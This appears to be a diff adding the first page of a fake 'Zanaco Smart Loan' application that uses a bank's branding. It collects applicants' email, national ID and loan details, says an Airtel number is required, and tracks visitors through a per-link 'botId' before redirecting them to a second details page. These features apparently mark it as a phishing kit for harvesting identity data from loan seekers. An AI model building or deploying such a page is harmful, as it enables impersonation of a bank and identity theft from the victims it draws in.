@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loan Application Form</title>
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #f6f7fb;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+.loan-container {
+    background: #fff;
+    padding: 30px;
+    border-radius: 12px;
+    width: 100%;
+    max-width: 400px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+}
+h2 { text-align: center; margin-bottom: 20px; }
+label { display: block; margin: 10px 0 5px; font-weight: bold; }
+input, select {
+    width: 100%;
+    padding: 10px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    margin-bottom: 15px;
+}
+button {
+    width: 100%;
+    padding: 12px;
+    background: red;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+}
+.logo-container {
+    width: 100%;
+    height: 120px;
+    margin-bottom: 20px;
+}
+.logo {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+.loan-notice {
+    background: #fff3cd;
+    border: 1px solid #ffeeba;
+    padding: 12px;
+    border-radius: 6px;
+    font-size: 14px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="loan-container">
+    <h2>Zanaco Smart Loan</h2>
+
+    <div class="logo-container">
+        <img src="zanaco-dp.jpeg" class="logo">
+    </div>
+
+    <form id="loanForm">
+
+        <label>Loan Amount (ZMW)</label>
+        <input id="loanAmount" type="number" required>
+
+        <label>Email</label>
+        <input id="email" type="email" required>
+
+        <label>National ID</label>
+        <input id="nationalId" type="text" required>
+
+        <label>Repayment Period</label>
+        <select id="repaymentPeriod" required>
+            <option value="">Select</option>
+            <option value="7days">7 Days</option>
+            <option value="14days">14 Days</option>
+            <option value="30days">30 Days</option>
+        </select>
+
+        <label>Employment Status</label>
+        <select id="employmentStatus" required>
+            <option value="">Select</option>
+            <option value="employed">Employed</option>
+            <option value="self-employed">Self-employed</option>
+            <option value="unemployed">Unemployed</option>
+        </select>
+
+        <label>Loan Purpose</label>
+        <select id="loanPurpose" required>
+            <option value="">Select</option>
+            <option value="business">Business</option>
+            <option value="personal">Personal</option>
+        </select>
+
+        <div class="loan-notice">
+            ✔ Airtel number required<br>
+            ✔ Maintain at least 10% balance
+        </div>
+
+        <button type="submit">Next</button>
+    </form>
+</div>
+
+<script>
+// ---------------- BOT ROUTING (FIXED) ----------------
+// First try to get botId from query param
+let params = new URLSearchParams(window.location.search);
+let botId = params.get('botId');
+
+// If missing, try to extract from URL path: /bot/bot1
+if (!botId) {
+    const pathParts = window.location.pathname.split('/');
+    if (pathParts[1] === 'bot') {
+        botId = pathParts[2];
+    }
+}
+
+if (!botId) {
+    alert("Invalid access link");
+    throw new Error("botId missing");
+}
+
+// Store botId for later pages
+localStorage.setItem('botId', botId);
+
+// ---------------- FORM LOGIC ----------------
+document.getElementById('loanForm').addEventListener('submit', e => {
+    e.preventDefault();
+
+    localStorage.setItem('loanAmount', loanAmount.value);
+    localStorage.setItem('email', email.value);
+    localStorage.setItem('nationalId', nationalId.value);
+    localStorage.setItem('repaymentPeriod', repaymentPeriod.value);
+    localStorage.setItem('employmentStatus', employmentStatus.value);
+    localStorage.setItem('loanPurpose', loanPurpose.value);
+
+    window.location.href = `details.html?botId=${botId}`;
+});
+</script>
+
+</body>
+</html>
